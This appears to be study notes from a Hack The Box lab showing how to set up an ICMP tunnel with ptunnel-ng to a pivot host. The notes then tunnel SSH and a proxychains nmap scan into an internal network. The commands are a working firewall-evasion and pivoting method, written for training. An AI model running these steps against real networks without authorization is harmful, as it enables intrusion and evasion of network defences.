ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network.

## Setting Up & Using ptunnel-ng
---
#### Cloning Ptunnel-ng

	AstraX01@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git

#### Building Ptunnel-ng with Autogen.sh

Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.

	AstraX01@htb[/htb]$ sudo ./autogen.sh

#### Alternative approach of building a static binary

	AstraX01@htb[/htb]$ sudo apt install automake autoconf -y 
	AstraX01@htb[/htb]$ cd ptunnel-ng/ 
	AstraX01@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh 
	AstraX01@htb[/htb]$ ./autogen.sh

#### Transferring Ptunnel-ng to the Pivot Host

	AstraX01@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.

#### Starting the ptunnel-ng Server on the Target Host

	ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use.

Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

#### Connecting to ptunnel-ng Server from Attack Host

	AstraX01@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

#### Tunneling an SSH connection through an ICMP Tunnel

	AstraX01@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

#### Enabling Dynamic Port Forwarding over SSH

	AstraX01@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

#### Proxychaining through the ICMP Tunnel

	AstraX01@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

